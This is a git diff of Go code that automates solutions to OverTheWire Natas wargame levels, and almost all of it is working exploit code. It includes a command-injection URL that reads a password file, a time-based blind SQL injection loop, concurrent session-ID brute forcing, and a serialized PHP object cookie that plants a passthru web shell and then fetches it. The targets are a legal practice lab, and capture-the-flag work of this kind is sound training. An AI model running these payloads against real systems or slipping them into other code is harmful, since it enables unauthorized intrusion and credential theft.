@@ -157,7 +157,7 @@ func Init(){
 
 	//Natas10
 	Solutions = append(Solutions, func(username string, password string)string{
-		req, _ := http.NewRequest("GET", "http://natas10.natas.labs.overthewire.org/?needle=%22%22+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search", nil)
+		req, _ := http.NewRequest("GET", "http://natas10.natas.labs.overthewire.org/?needle=%24%28cat%20%2Fetc%2Fnatas_webpass%2Fnatas11%29%20%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search", nil)
 		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil{
@@ -375,29 +375,30 @@ func Init(){
 
 		for _, v := range(allLetters) {
 			letter := string(v)
-			req, _ := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte(`username=natas18" and password LIKE BINARY "%`+letter+`%" AND SLEEP(1); #"`)))
+			req, _ := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte(`username=natas18" and password LIKE BINARY "%`+letter+`%" AND SLEEP(0.2); #"`)))
 			req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
 			req.SetBasicAuth(username, password)
 			start := time.Now()
 			resp, err := http.DefaultClient.Do(req)
 			passed := time.Since(start)
 			if err == nil && resp.StatusCode == 200{
-				if passed > time.Second {
+				if passed > time.Millisecond * 400 {
 					letters = letters + letter
 				}
 			}
+			//fmt.Println(passed)
 		}
 		for i:=0;i<32;i++ {
 			for _, v := range (letters) {
 				letter := string(v)
-				req, _ := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte(`username=natas18" and password LIKE BINARY "` + newPass + letter + `%" AND SLEEP(1); #"`)))
+				req, _ := http.NewRequest("POST", "http://natas17.natas.labs.overthewire.org/index.php", bytes.NewBuffer([]byte(`username=natas18" and password LIKE BINARY "` + newPass + letter + `%" AND SLEEP(0.2); #"`)))
 				req.Header["Content-Type"] = []string{"application/x-www-form-urlencoded"}
 				req.SetBasicAuth(username, password)
 				start := time.Now()
 				_, err := http.DefaultClient.Do(req)
 				passed := time.Since(start)
 				if err == nil {
-					if passed > time.Second {
+					if passed > time.Millisecond * 400 {
 						newPass = newPass + letter
 						fmt.Print(letter)
 						break
@@ -410,7 +411,9 @@ func Init(){
 
 	//Natas18
 	Solutions = append(Solutions, func(username string, password string)string{
-		for i:=1; i<641; i++ {
+		returChan := make(chan string)
+
+		doTest := func(i int, returnChan chan string){
 			req, _ := http.NewRequest("GET", "http://natas18.natas.labs.overthewire.org/", nil)
 			req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: strconv.Itoa(i)})
 			req.SetBasicAuth(username, password)
@@ -419,16 +422,23 @@ func Init(){
 				body, _ := ioutil.ReadAll(resp.Body)
 				if len(body) > 1000 {
 					newPass := findPassword(string(body))
-					return newPass
+					returnChan <- newPass
 				}
 			}
 		}
-		return ""
+
+		for i:=1; i<641; i++ {
+			go doTest(i, returChan)
+		}
+		return <- returChan
 	})
 
 	//Natas19
 	Solutions = append(Solutions, func(username string, password string)string{
-		for i:=1; i<641; i++ {
+
+		returChan := make(chan string)
+
+		doTest := func(i int, returnChan chan string) {
 			req, _ := http.NewRequest("GET", "http://natas19.natas.labs.overthewire.org/", nil)
 			req.AddCookie(&http.Cookie{Name: "PHPSESSID", Value: hex.EncodeToString([]byte(strconv.Itoa(i) + "-admin"))})
 			req.SetBasicAuth(username, password)
@@ -437,11 +447,15 @@ func Init(){
 				body, _ := ioutil.ReadAll(resp.Body)
 				if len(body) > 1050 {
 					newPass := findPassword(string(body))
-					return newPass
+					returnChan <- newPass
 				}
 			}
 		}
-		return ""
+
+		for i:=1; i<641; i++ {
+			go doTest(i, returChan)
+		}
+		return <- returChan
 	})
 
 	//Natas20
@@ -545,6 +559,9 @@ func Init(){
 		req, _ := http.NewRequest("GET", "http://natas26.natas.labs.overthewire.org/", nil)
 		req.SetBasicAuth(username, password)
 		req.AddCookie(&http.Cookie{Name:"drawing", Value:"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoiSGkKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTE6Ijw/IHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KCiI7fQ=="})
+		http.DefaultClient.Do(req)
+		req, _ = http.NewRequest("GET", "http://natas26.natas.labs.overthewire.org/img/test.php", nil)
+		req.SetBasicAuth(username, password)
 		resp, err := http.DefaultClient.Do(req)
 		if err == nil {
 			body, _ := ioutil.ReadAll(resp.Body)
